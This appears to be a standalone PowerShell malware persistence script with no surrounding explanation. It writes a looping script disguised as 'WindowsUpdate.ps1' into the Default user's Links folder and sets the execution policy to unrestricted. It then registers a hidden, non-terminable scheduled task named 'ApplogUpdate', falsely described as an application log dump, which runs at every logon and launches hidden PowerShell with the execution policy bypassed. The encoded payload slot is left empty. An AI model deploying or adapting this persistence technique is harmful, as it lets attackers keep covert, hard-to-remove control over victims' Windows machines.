set-executionpolicy unrestricted -Force
New-Item -Path "C:\Users\Default\Links\" -Name "WindowsUpdate.ps1" -Value 'set-executionpolicy unrestricted -Force
$go = "powershell.exe -nop -ep bypass -Encoded "
$Update=0
do{
    if (!(Get-Process -Name powershell.exe -ErrorAction SilentlyContinue))
    { $go
           Sleep 30
    }
    $go
     Sleep 2
}until ($Update -eq 1)' -Force
$A = New-ScheduledTaskAction -Execute "C:\Users\Default\Links\WindowsUpdate.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -WindowStyle Hidden -command "powershell.exe -windowstyle Hidden -nop -ep bypass -noexit -file "C:\Users\Default\Links\WindowsUpdate.ps1""'
$trigger =  New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -Priority 5  -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries -DisallowHardTerminate
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ApplogUpdate" -Description "Daily dump of Applog" -Settings $settings -Force
Start-Process powershell.exe -Args '-NoProfile -WindowStyle Hidden -command "powershell.exe -windowstyle Hidden -nop -ep bypass -noexit -file "C:\Users\Default\Links\WindowsUpdate.ps1""'
